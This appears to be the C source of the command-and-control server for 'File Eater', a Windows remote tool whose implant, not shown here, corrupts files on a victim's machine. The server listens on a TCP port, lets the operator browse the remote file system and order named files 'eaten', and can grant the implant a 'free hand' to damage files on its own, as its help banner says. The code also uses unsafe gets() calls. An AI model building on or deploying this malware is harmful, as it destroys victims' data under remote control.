#include <stdio.h>
#include <winsock2.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

// Declaring needed variables globally
WSADATA wsa;
SOCKET s, new_socket;
struct sockaddr_in server, client;
int c, recv_size;
char buffer[2048], dirName[2048];
;

// Repetitive code declared as functions here...

// Called when any error is caught, to stop the program then and there
void error()
{
	exit(1);
}

// Initialize WinSock
void initWinSock()
{
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("\nFailed. Error Code : %d", WSAGetLastError());
		error();
	}
}

// Create and initialize socket
void createAndBindSock()
{

	if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
	{
		printf("\n[!] Could not create socket : %d", WSAGetLastError());
		error();
	}

	// Prepare the sockaddr_in structure
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(8888);

	// Bind
	if (bind(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
	{
		printf("\nBind failed with error code : %d", WSAGetLastError());
		error();
	}
}

// Listen for any incomming connections and accept them
void listenAndAcceptConn()
{
	listen(s, 3);

	c = sizeof(struct sockaddr_in);
	new_socket = accept(s, (struct sockaddr *)&client, &c);
	if (new_socket == INVALID_SOCKET)
	{
		printf("\naccept failed with error code : %d", WSAGetLastError());
		error();
	}
}

// Recieve data and load it into buffer
void reliableRecieve()
{

	// Cleaning buffer before data comes.
	memset(buffer, 0, strlen(buffer));

	if ((recv_size = recv(new_socket, buffer, sizeof(buffer), 0)) == SOCKET_ERROR)
	{
		printf("\n[!] Recieve Failed.");
	}

	buffer[recv_size] = '\0';
}

// Send all the data in the buffer
void reliableSend()
{
	// Sending message to client
	send(new_socket, buffer, strlen(buffer), 0);
}

// Show the skull animation
void showAnimation()
{
	system("cls");
	fprintf(stderr, "         _______________\n");
	fprintf(stderr, "        /               \\\n");
	fprintf(stderr, "       /                 \\\n");
	fprintf(stderr, "      /                   \\\n");
	fprintf(stderr, "      |   XXXX     XXXX   |\n");
	fprintf(stderr, "      |   XXXX     XXXX   |\n");
	fprintf(stderr, "      |   XXX       XXX   |\n");
	fprintf(stderr, "      |         X         |\n");
	fprintf(stderr, "      \\__      XXX     __/\n");
	fprintf(stderr, "        |\\     XXX     /|\n");
	fprintf(stderr, "        | |           | |\n");
	fprintf(stderr, "        | I I I I I I I |\n");
	fprintf(stderr, "        |  I I I I I I  |\n");
	fprintf(stderr, "         \\_           _/\n");
	fprintf(stderr, "          \\_         _/\n");
	fprintf(stderr, "            \\_______/\n");
	fprintf(stderr, "  XXX                        XXX\n");
	fprintf(stderr, "XXXXX                        XXXXX\n");
	fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
	fprintf(stderr, "         XXXXX     XXXXX\n");
	fprintf(stderr, "             XXXXXXX\n");
	fprintf(stderr, "         XXXXX     XXXXX\n");
	fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
	fprintf(stderr, "XXXXX                        XXXXX\n");
	fprintf(stderr, "  XXX                        XXX\n");
	Sleep(3000);

	system("color 70");

	int jawLength = 10;

	for (int i = 0; i < jawLength; i++)
	{
		system("cls");
		fprintf(stderr, "         _______________\n");
		fprintf(stderr, "        /               \\\n");
		fprintf(stderr, "       /                 \\\n");
		fprintf(stderr, "      /                   \\\n");
		fprintf(stderr, "      |   XXXX     XXXX   |\n");
		fprintf(stderr, "      |   X XX     XX X   |\n");
		fprintf(stderr, "      |   XXX       XXX   |\n");
		fprintf(stderr, "      |         X         |\n");
		fprintf(stderr, "      \\__      XXX     __/\n");
		fprintf(stderr, "        |\\     XXX     /|\n");
		fprintf(stderr, "        | I I I I I I I |\n");
		fprintf(stderr, "        |               |\n");
		for (int j = 0; j < i; j++)
		{
			fprintf(stderr, "        |               |\n");
		}
		fprintf(stderr, "        |               |\n");
		fprintf(stderr, "         \\I I I I I I _/\n");
		fprintf(stderr, "          \\_         _/\n");
		fprintf(stderr, "            \\_______/\n");
		fprintf(stderr, "  XXX                        XXX\n");
		fprintf(stderr, "XXXXX                        XXXXX\n");
		fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
		fprintf(stderr, "         XXXXX     XXXXX\n");
		fprintf(stderr, "             XXXXXXX\n");
		fprintf(stderr, "         XXXXX     XXXXX\n");
		fprintf(stderr, " XXXXXXXXXX             XXXXXXXXXX\n");
		fprintf(stderr, "XXXXX                        XXXXX\n");
		fprintf(stderr, "  XXX                        XXX\n");

		if (i % 2 == 0)
		{
			system("color 70");
		}
		else
		{
			system("color 07");
		}

		if (i < (int)jawLength / 2)
		{
			Sleep(20);
		}
		else
		{
			Sleep(10);
		}
	}

	system("color 07");
	system("cls");
}

// Put data in buffer
void writeToBuffer(char data[])
{
	// Clearing old data
	memset(buffer, 0, strlen(buffer));

	// Putting new data
	strcpy(buffer, data);
}

void showHelpBanner()
{
	system("cls");

	fprintf(stderr, "   _____ ___.                  __                             \n");
	fprintf(stderr, "  /  _  \\\\_ |__   ____  __ ___/  |_                           \n");
	fprintf(stderr, " /  /_\\  \\| __ \\ /  _ \\|  |  \\   __\\                          \n");
	fprintf(stderr, "/    |    \\ \\_\\ (  <_> )  |  /|  |                            \n");
	fprintf(stderr, "\\____|__  /___  /\\____/|____/ |__|                            \n");
	fprintf(stderr, "        \\/    \\/                                              \n");
	fprintf(stderr, "___________.__.__         ___________       __                \n");
	fprintf(stderr, "\\_   _____/|__|  |   ____ \\_   _____/____ _/  |_  ___________ \n");
	fprintf(stderr, " |    __)  |  |  | _/ __ \\ |    __)_\\__  \\\\   __\\/ __ \\_  __ \\\n");
	fprintf(stderr, " |     \\   |  |  |_\\  ___/ |        \\/ __ \\|  | \\  ___/|  | \\/\n");
	fprintf(stderr, " \\___  /   |__|____/\\___  >_______  (____  /__|  \\___  >__|   \n");
	fprintf(stderr, "     \\/                 \\/        \\/     \\/          \\/       \n\n\n");

	fprintf(stderr, "Q. WHAT IS FILE EATER???\n");
	fprintf(stderr, "A. File Eater, a serpent by nature, seamlessly working as an undercover agent right under your command.\n\n");
	fprintf(stderr, "Q. WHAT DO THE OPTIONS DO???\n");
	fprintf(stderr, "\nHere's how you can use each of the options explained below:-\n\n");
	fprintf(stderr, "OPTION 0: Quit\nEXPLANATION: Wrap it up and Take off (Exits the program :v ).\n\n\n");
	fprintf(stderr, "OPTION 1: Get list of files in CWD\nEXPLANATION: Retrieve the list of files in the current working directory(CWD) i.e. the location where the program is currently 'active' or 'working'.\n\n\n");
	fprintf(stderr, "OPTION 2: Get path of CWD\nEXPLANATION: Fetching the location in the system where the program is currently operating or looking for files to eat.\n\n\n");
	fprintf(stderr, "OPTION 3: Go to a specific folder in CWD\nEXPLANATION: Navigating to a specific folder in the CWD to switch the focus of the program to operate within that file.\n\n\n");
	fprintf(stderr, "OPTION 4: Go to parent folder of CWD\nEXPLANATION: Move to the directory containing the CWD.\n\n\n");
	fprintf(stderr, "OPTION 5: Eat a file in CWD\nEXPLANATION: Lets the user corrupt(eat :p) any file provided by them in the CWD.\n\n\n");
	fprintf(stderr, "OPTION 6: Give Free Hand\nEXPLANATION: Granting unrestricted freedom by handing over the keys, and letting File Eater run wild and mess up files as it pleases.\n\n\n");
	fprintf(stderr, "OPTION 7: Take Away Free Hand\nEXPLANATION: Reeling it in, yanking back the full freedom given earlier to File Eater :(.\n\n\n");

	printf("\n\nPress any key to continue...");
	fflush(stdin);
	getchar();
}

int main(int argc, char *argv[])
{

	// Main Code
	showAnimation();

	system("cls");

	fprintf(stderr, "___________.__.__           ___________       __                \n");
	fprintf(stderr, "\\_   _____/|__|  |   ____   \\_   _____/____ _/  |_  ___________ \n");
	fprintf(stderr, " |    __)  |  |  | _/ __ \\   |    __)_\\__  \\   __\\/ __ \\_  __ \\\n");
	fprintf(stderr, " |     \\   |  |  |_\\  ___/   |        \\/ __ \\|  | \\  ___/|  | \\/\n");
	fprintf(stderr, " \\___  /   |__|____/\\___  > /_______  (____  /__|  \\___  >__|   \n");
	fprintf(stderr, "     \\/                 \\/          \\/     \\/          \\/       \n");
	fprintf(stderr, "\n");

	Sleep(100);
	fprintf(stderr, "[+] Welcome...\n");

	fprintf(stderr, "[+] Setting things up...\r");
	initWinSock();
	createAndBindSock();
	fprintf(stderr, "[+] Setting things up... Done.\n");

	fprintf(stderr, "[+] Listening for connections...\n");
	listenAndAcceptConn();
	fprintf(stderr, "[+] Connected.\n");

	int running = 1;
	Sleep(2000);
	system("cls");
	while (running)
	{
		int choice = -1;

		fprintf(stderr, "___________.__.__           ___________       __                \n");
		fprintf(stderr, "\\_   _____/|__|  |   ____   \\_   _____/____ _/  |_  ___________ \n");
		fprintf(stderr, " |    __)  |  |  | _/ __ \\   |    __)_\\__  \\   __\\/ __ \\_  __ \\\n");
		fprintf(stderr, " |     \\   |  |  |_\\  ___/   |        \\/ __ \\|  | \\  ___/|  | \\/\n");
		fprintf(stderr, " \\___  /   |__|____/\\___  > /_______  (____  /__|  \\___  >__|   \n");
		fprintf(stderr, "     \\/                 \\/          \\/     \\/          \\/       \n");
		fprintf(stderr, "\n");
		fprintf(stderr, "\nThese are your options :-\n\n");
		fprintf(stderr, "(0) Quit.\n");
		fprintf(stderr, "(1) Get list of files in CWD.\n");
		fprintf(stderr, "(2) Get path of CWD.\n");
		fprintf(stderr, "(3) Go to a specific folder in CWD.\n");
		fprintf(stderr, "(4) Go to parent folder of CWD.\n");
		fprintf(stderr, "(5) Eat a file in CWD.\n");
		fprintf(stderr, "(6) Give Free Hand.\n");
		fprintf(stderr, "(7) Take Away Free Hand.\n");
		fprintf(stderr, "(8) Help Manaual\n");

		fprintf(stderr, "\nYour selected option: ");
		fflush(stdin);
		scanf("%d", &choice);

		switch (choice)
		{
		case 0:
			running = 0;
			break;

		case 1:
			fprintf(stderr, "\n[+] Requesting client to send files data...");

			// Asking client to send directory data
			writeToBuffer(" 1");
			reliableSend();

			// Recieving direcory data
			reliableRecieve();
			fprintf(stderr, "\n[+] Recieved files data from client.");
			fprintf(stderr, "\n%s", buffer);

			break;

		case 2:
			fprintf(stderr, "\n[+] Requesting client to send current working directory...");

			// Asking client to send cwd
			writeToBuffer(" 2");
			reliableSend();

			// Recieving data
			reliableRecieve();
			fprintf(stderr, "\n[+] CWD is: ");
			fprintf(stderr, "\n%s", buffer);

			break;

		case 3:
			// Asking client to switch to a folder
			writeToBuffer(" 3");
			reliableSend();

			fprintf(stderr, "\n[+] Requesting client to go to specific directory...");

			// Sending folder name to client

			memset(buffer, 0, strlen(dirName));

			fprintf(stderr, "\nEnter name of the directory you want to switch to: ");
			fflush(stdin);
			gets(dirName);

			writeToBuffer(dirName);
			reliableSend();

			// Recieving data
			reliableRecieve();
			fprintf(stderr, "\n[+] CWD changed to: ");
			fprintf(stderr, "\n%s", buffer);

			break;

		case 4:
			fprintf(stderr, "\n[+] Requesting client to go to parent directory...");

			// Asking client to send cwd
			writeToBuffer(" 4");
			reliableSend();

			// Recieving data
			reliableRecieve();
			fprintf(stderr, "\n[+] CWD changed to: ");
			fprintf(stderr, "\n%s", buffer);

			break;

		case 5:
			// Asking client to eat a folder
			writeToBuffer(" 5");
			reliableSend();

			fprintf(stderr, "\n[+] Requesting client to eat a specific directory...");

			// Sending folder name to client

			memset(buffer, 0, strlen(dirName));

			fprintf(stderr, "\nEnter name of the directory you want to eat: ");
			fflush(stdin);
			gets(dirName);

			writeToBuffer(dirName);
			reliableSend();

			// Recieving data
			reliableRecieve();
			fprintf(stderr, "\n[+] File eater says:");
			fprintf(stderr, "\n%s", buffer);

			break;

		case 6:
			fprintf(stderr, "\n[+] Giving free hand to agent file eater...");

			// Asking client to send cwd
			writeToBuffer(" 6");
			reliableSend();

			// Recieving data
			reliableRecieve();
			fprintf(stderr, "\n[+] Report says:");
			puts(buffer);

			break;

		case 7:
			fprintf(stderr, "\n[+] Taking free hand from agent file eater...");

			// Asking client to send cwd
			writeToBuffer(" 7");
			reliableSend();

			// Recieving data
			reliableRecieve();
			fprintf(stderr, "\n[+] Report says:");
			puts(buffer);

			break;

		case 8:
			showHelpBanner();
			break;

		default:
			fprintf(stderr, "\n[-] Incorrect Option Chosen.");
			break;
		}

		if (choice != 0)
		{
			fflush(stdin);
			printf("\n\nPress any key to continue...");
			getchar();
			system("cls");
		}
	}
	// Not closing properly on purpose
	// closesocket(s);
	// closesocket(new_socket);

	return 0;
}